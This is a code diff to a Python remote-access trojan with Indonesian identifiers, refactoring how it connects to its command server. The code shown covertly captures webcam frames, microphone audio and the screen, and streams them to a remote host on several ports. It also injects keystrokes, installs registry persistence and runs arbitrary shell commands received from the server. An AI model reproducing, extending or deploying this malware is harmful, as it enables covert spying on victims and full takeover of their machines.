@@ -21,8 +21,9 @@ from mss import mss
 import numpy as np
 
 sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ip = '[server_ip]'
 
-def send_camera_image(server_ip, port=9999):
+def send_camera_image(ip, port=9999):
     cap = cv2.VideoCapture(0)
     ret, frame = cap.read()
     cap.release()
@@ -34,7 +35,7 @@ def send_camera_image(server_ip, port=9999):
     data = img_encoded.tobytes()
 
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect((server_ip, port))
+    client.connect((ip, port))
 
     client.sendall(struct.pack("!I", len(data)))
     client.sendall(data)
@@ -44,7 +45,7 @@ def send_camera_image(server_ip, port=9999):
 keyb = Controller()
 def acc_keystroke():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect(('[ip_server]', 9995))
+        s.connect((ip, 9995))
         while True:
             data = s.recv(1024)
             if not data:
@@ -78,7 +79,7 @@ def record_n_send():
     frame = []
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect(('[ip_server]', 9996))
+            s.connect((ip, 9996))
             for _ in range(0, int(RATE / CHUNK * 20)):
                 data = stream.read(CHUNK)
                 s.sendall(data)
@@ -102,9 +103,9 @@ def  execute_persistence(nama_registry, file_exe):
     except:
         pass
     
-def send_screen_record(server_ip, port=9991):
+def send_screen_record(ip, port=9991):
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect((server_ip, port))
+    client.connect((ip, port))
     
     sct = mss()
     monitor = sct.monitors[1]
@@ -131,7 +132,7 @@ def send_screen_record(server_ip, port=9991):
 def byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        sock.connect(('[ip_server]', 9998))
+        sock.connect((ip, 9998))
         vid = cv2.VideoCapture(0)
         while vid.isOpened:
             img, frame = vid.read()
@@ -235,7 +236,7 @@ def jalankan_perintah():
             upload_file('ss.png')
             os.remove("ss.png")
         elif perintah == 'screen_share':
-            send_screen_record(server_ip='[ip_server]', port=9991)
+            send_screen_record(ip=ip, port=9991)
         elif perintah[:11] == 'persistence':
             nama_registry, file_exe = perintah[12:].split(' ')
             execute_persistence(nama_registry, file_exe)
@@ -246,7 +247,7 @@ def jalankan_perintah():
         elif perintah == 'send_key':
             acc_keystroke()
         elif perintah == 'snap_cam':
-            send_camera_image(server_ip='[ip_server]', port=9993)
+            send_camera_image(ip=ip, port=9993)
         elif perintah[:7] == 'execute':
             if shutil.which(perintah[8:]):
                 os.system(f"start {perintah[8:]}")
@@ -265,6 +266,7 @@ def jalankan_perintah():
             stderr=PIPE,
             stdin=PIPE
         )
+            print(exe)
             data =exe.stdout.read() + exe.stderr.read()
             data = data.decode()
             output = json.dumps(data)
@@ -273,7 +275,7 @@ def jalankan_perintah():
 def execute_persist():
     while True:
         try:
-            sok.connect(('[ip_server]', 9999))
+            sok.connect((ip, 9999))
             jalankan_perintah()
             sok.close()
             break
